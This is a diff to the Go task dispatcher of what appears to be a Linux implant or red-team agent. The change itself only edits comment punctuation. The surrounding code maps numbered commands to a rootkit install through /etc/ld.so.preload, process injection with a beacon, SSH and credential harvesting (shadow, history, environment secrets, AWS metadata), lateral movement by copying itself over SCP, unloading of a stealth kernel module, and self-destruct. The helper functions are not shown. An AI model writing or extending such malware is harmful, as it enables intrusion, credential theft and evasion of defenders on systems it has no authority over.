@@ -74,11 +74,11 @@ func Dispatch(ttpNum int, params string, serverAddr string, agentID string, secr
 		return fmt.Sprintf("exec_chain:\n%s", out), nil
 
 	case 10:
-		// install rootkit — deploy bat-rootkit.so via /etc/ld.so.preload
+		// install rootkit   deploy bat-rootkit.so via /etc/ld.so.preload
 		return InstallRootkit()
 
 	case 11:
-		// inject process — spawn beacon + rawsock threads in target daemon, then self-exit
+		// inject process   spawn beacon + rawsock threads in target daemon, then self-exit
 		// Derive 8-byte magic key: first 8 bytes of SHA-256(secret).
 		// The server uses the same derivation when sending the trigger magic packet.
 		h := sha256.Sum256([]byte(secret))
@@ -115,20 +115,20 @@ func Dispatch(ttpNum int, params string, serverAddr string, agentID string, secr
 		return result, nil
 
 	case 20:
-		// network recon — ARP table + TCP :22 scan
+		// network recon   ARP table + TCP :22 scan
 		return NetworkRecon()
 
 	case 21:
-		// SSH key harvest — private keys, known_hosts, authorized_keys, config
+		// SSH key harvest   private keys, known_hosts, authorized_keys, config
 		return SSHHarvest()
 
 	case 22:
-		// lateral movement — SCP self to remote target via SSH, exec detached
+		// lateral movement   SCP self to remote target via SSH, exec detached
 		// params: "<targetIP> [keyPath]"
 		return LateralMove(params)
 
 	case 23:
-		// credential harvest — shadow, history, SSH keys, env secrets, AWS IMDS
+		// credential harvest   shadow, history, SSH keys, env secrets, AWS IMDS
 		return CredDump()
 
 	case 1003:
@@ -144,7 +144,7 @@ func Dispatch(ttpNum int, params string, serverAddr string, agentID string, secr
 
 	case 1099:
 		// K-99: unload bat-stealth.ko (2-phase procedure)
-		// Phase 1: sysfs trigger — prepares module for unload (selfdefense_exit + module_unhide)
+		// Phase 1: sysfs trigger   prepares module for unload (selfdefense_exit + module_unhide)
 		if err := os.WriteFile(sysfsBase+"/sched_reset", []byte("1"), 0200); err != nil {
 			return "", fmt.Errorf("[K-99] phase1 sysfs: %w", err)
 		}
@@ -170,12 +170,12 @@ func Dispatch(ttpNum int, params string, serverAddr string, agentID string, secr
 		return "[stealth_unloaded]", nil
 
 	case 99:
-		// kill switch — silent self-termination
+		// kill switch   silent self-termination
 		os.Exit(0)
 		return "", nil
 
 	case 222:
-		// self-destruct — remove all artifacts, wipe memory, exit
+		// self-destruct   remove all artifacts, wipe memory, exit
 		SelfDestruct()
 		return "", nil // unreachable
 
